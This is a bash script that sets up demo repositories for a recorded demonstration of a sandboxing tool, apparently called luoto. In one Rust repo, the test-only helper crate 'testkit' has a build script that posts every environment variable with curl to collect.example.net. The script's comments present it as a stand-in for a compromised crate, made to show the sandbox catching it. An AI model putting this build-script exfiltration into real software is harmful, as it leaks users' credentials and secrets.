#!/usr/bin/env bash
# Run, out of sight, at the start of a cast: ~/demo with four small repos, and the canned model
# server (canned.py). `just casts` stops the server and removes the env and the folder afterwards.
# The folder holds a marker, .luoto-cast (the server's pid): one without it is never touched.
set -eu

CAST=$HOME/demo
here=$(cd "$(dirname "$0")" && pwd)
if [ -e "$CAST" ] && [ ! -e "$CAST/.luoto-cast" ]; then
  echo "$CAST exists; a cast makes its repos there, so move it first" >&2
  exit 1
fi
# The server of a cast before this one.
kill "$(cat "$CAST/.luoto-cast" 2>/dev/null)" 2>/dev/null || true
rm -rf "$CAST" && mkdir -p "$CAST" && touch "$CAST/.luoto-cast"

commit() {
  git init -q -b main
  git add . && git -c user.name=cast -c user.email=cast@example.com commit -qm init
}

# A small API whose routes (app.py) are read again on every request, so an edit to them answers
# at once; it starts with none but 404.
mkdir -p "$CAST/api" && cd "$CAST/api"
printf '# api\n' >README.md
cat >main.py <<'PY'
import importlib
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

sys.dont_write_bytecode = True
import app  # noqa: E402


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        importlib.reload(app)
        status, body = app.route(self.path)
        self.send_response(status)
        self.end_headers()
        self.wfile.write(body.encode())

    def log_message(self, *_):
        pass


HTTPServer(("127.0.0.1", 8000), Handler).serve_forever()
PY
cat >app.py <<'PY'
def route(path):
    return 404, "not found\n"
PY
commit

mkdir -p "$CAST/app" && cd "$CAST/app"
printf '# app\n' >README.md
printf '<!doctype html><title>app</title>\n' >index.html
commit

# A folder for an env with nothing to build.
mkdir -p "$CAST/tz" && cd "$CAST/tz"
printf '# tz\n' >README.md
commit

# A small CLI in Rust, on the toolchain its rust-toolchain.toml pins, that so far has only its
# splash screen (src/splash.rs), a plain one. Its dev-dependency, testkit, stands in for a
# compromised crate: its build script posts the environment to a host of its own. Only tests
# build it, only in a luoto sandbox does it act, and its host has no address.
mkdir -p "$CAST/pulse/src" "$CAST/pulse/tests" "$CAST/pulse/testkit/src" && cd "$CAST/pulse"
printf '# pulse\n' >README.md
printf '/target\n' >.gitignore
printf '[toolchain]\nchannel = "1.98.1"\n' >rust-toolchain.toml
cat >Cargo.toml <<'TOML'
[package]
name = "pulse"
version = "0.1.0"
edition = "2024"

[dev-dependencies]
testkit = { path = "testkit" }
TOML
cat >src/main.rs <<'RS'
use std::io::{IsTerminal, stdout};

fn main() -> std::io::Result<()> {
    pulse::splash::show(&mut stdout(), stdout().is_terminal())
}
RS
printf 'pub mod splash;\n' >src/lib.rs
cat >src/splash.rs <<'RS'
use std::io::{self, Write};

/// The splash screen; `tty` says whether `out` is a terminal.
pub fn show(out: &mut impl Write, _tty: bool) -> io::Result<()> {
    writeln!(out, "pulse")?;
    writeln!(out, "response times at a glance")
}
RS
cat >tests/splash.rs <<'RS'
use pulse::splash;

fn shown() -> String {
    let mut out = Vec::new();
    splash::show(&mut out, false).unwrap();
    String::from_utf8(out).unwrap()
}

#[test]
fn names_the_tool() {
    assert!(shown().contains("pulse"));
}

#[test]
fn says_what_it_is_for() {
    assert!(shown().contains("response times at a glance"));
}
RS
cat >testkit/Cargo.toml <<'TOML'
[package]
name = "testkit"
version = "0.1.0"
edition = "2024"
TOML
: >testkit/src/lib.rs
cat >testkit/build.rs <<'RS'
use std::io::Write;
use std::path::Path;
use std::process::{Command, Stdio};

fn main() {
    if !Path::new("/opt/luoto").exists() {
        return;
    }
    let env: String = std::env::vars().map(|(k, v)| format!("{k}={v}\n")).collect();
    let curl = Command::new("curl")
        .args(["-s", "-m", "5", "-o", "/dev/null", "--data-binary", "@-"])
        .arg("https://collect.example.net/env")
        .stdin(Stdio::piped())
        .spawn();
    if let Ok(mut curl) = curl {
        if let Some(mut stdin) = curl.stdin.take() {
            let _ = stdin.write_all(env.as_bytes());
        }
        let _ = curl.wait();
    }
}
RS
# The lock file and the first build, so neither shows as the env's change or the cast's wait.
cargo generate-lockfile --quiet --offline
cargo build --quiet --offline
commit

nohup python3 -I "$here/canned.py" 18000 >/dev/null 2>&1 &
echo $! >"$CAST/.luoto-cast"
